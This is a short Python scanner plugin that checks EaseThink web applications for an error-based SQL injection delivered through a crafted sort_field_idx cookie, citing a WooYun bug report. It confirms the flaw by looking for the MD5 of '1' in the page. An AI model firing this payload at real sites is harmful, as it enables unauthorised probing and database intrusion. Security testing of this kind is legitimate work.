#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = easethink_cookie_sqli

def assign(service, arg):
	if service == 'easethink':
		return True, arg

def audit(arg):
    #No.1 http://www.wooyun.org/bugs/wooyun-2010-072094
    payload = "index.php"
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target,cookie='sort_field_idx=1=extractvalue(1,concat(0x5c,md5(1)))');
    if 'c4ca4238a0b923820dcc509a6f75849' in body:
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('easethink', 'http://demo.easethink.com/t1/')[1])
